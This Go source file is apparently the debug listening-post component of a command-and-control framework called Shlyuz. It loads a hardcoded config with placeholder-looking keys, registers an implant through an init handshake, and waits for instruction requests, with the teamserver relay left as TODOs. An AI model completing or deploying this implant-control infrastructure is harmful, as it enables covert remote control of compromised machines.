package main

import (
	"log"
	"sync"
	"time"

	// "shlyuz/pkg/crypto/asymmetric"
	"shlyuz/internal/debugLp/pkg/transport"

	"shlyuz/internal/debugLp/pkg/component"
	"shlyuz/internal/debugLp/pkg/config"
	"shlyuz/internal/debugLp/pkg/transaction"
	"shlyuz/pkg/utils/idgen"
	"shlyuz/pkg/utils/logging"
	"shlyuz/pkg/utils/uname"
)

func makeManifest(componentId string) component.ComponentManifest {
	var generatedManifest component.ComponentManifest
	platInfo := uname.GetUname()
	generatedManifest.Hostname = platInfo.Uname.Nodename
	generatedManifest.Id = componentId
	generatedManifest.Os = platInfo.Uname.Sysname
	return generatedManifest
}

func genComponentInfo(lpConfig []byte) component.Component {
	var Component component.Component
	parsedConfig := config.ParseConfig(lpConfig)
	log.SetPrefix(logging.GetLogPrefix())
	log.Println("Started Shlyuz Debug LP")
	Component.CurrentKeypair = parsedConfig.CryptoConfig.CompKeyPair
	Component.InitalKeypair = Component.CurrentKeypair
	Component.Config = parsedConfig
	Component.ComponentId = Component.Config.Id
	Component.XorKey = Component.Config.CryptoConfig.XorKey
	Component.ConfigKey = Component.Config.CryptoConfig.SymKey
	Component.Manifest = makeManifest(Component.ComponentId)
	Component.CurrentImpPubkey = Component.Config.CryptoConfig.PeerPk

	return Component
}

func main() {
	log.SetPrefix(logging.GetLogPrefix())
	// TODO: make this real
	lpConfig :=
		[]byte(`[lp]
id = ` + idgen.GenerateComponentId() + `
transport_name = file_transport
task_check_time = 60
init_signature = b'\xde\xad\xf0\r'
` + `
[crypto]
imp_pk = 4b6d9dgg877lg3231n1gjbn2dgjb79g0gbb77998gggg668866468g334nlb820g
sym_key = BvjTA1o55UmZnuTy
xor_key = 0x6d
priv_key = jnbl37d67g656d617b19l6l02305g68l4d03ngn914800934511b2g13bgdg1021`)
	Component := genComponentInfo(lpConfig)
	// This is the start of the registration process for a client
	// TODO: This is a loop per implant
	var client transport.RegisteredComponent
	var err error
	transportWg := sync.WaitGroup{}
	defer transportWg.Wait()
	client.Transport, _, err = transport.PrepareTransport(&Component, []string{})
	if err != nil {
		log.Fatalln("transport failed to initalize: ", err)
	}

	client.InitalKeyPair = Component.InitalKeypair
	client.InitalPubKey = Component.CurrentImpPubkey // find a better way to do this
	client.CurKeyPair = client.InitalKeyPair
	client.CurPubKey = client.InitalPubKey
	client.XorKey = Component.XorKey
	client.TskChkTimer = Component.Config.TskChkTimer
	client.InitSignature = Component.Config.InitSignature
	client.SelfComponentId = Component.ComponentId

	// This client is now considered registe
	initAckInstruction, client, boolSuccess := transaction.RetrieveInitFrame(&client)
	if !boolSuccess {
		log.Println("implant failed to initalize")
		// TODO: Restart loop here
	}
	transaction.RelayInitFrame(&client, initAckInstruction)
	// TODO: Client is now considered registerd
	log.Println(client)

	// TODO: Implement loop here to do the actual stuff
	//  as an LP, we are awaiting a request for a command from an implant, which is then relayed to TS, where we get a command etc
	for {
		instructionRequestFrame, err := transaction.RetrieveInstructionRequest(&client) // Depending if we have something in the Queue for this implant, we'll relay an instruction
		if err != nil {
			log.Println("invalid instruction received: ")
			log.Println("[dbginstructframe]: ", instructionRequestFrame)
			log.Println(err)
			time.Sleep(time.Duration(Component.Config.TskChkTimer))
			break
		}
		// TODO: Teamserver interaction function
		// serverCmd := transaction.RelayInstructionToServer
		time.Sleep(time.Duration(Component.Config.TskChkTimer))
		break
	}
}
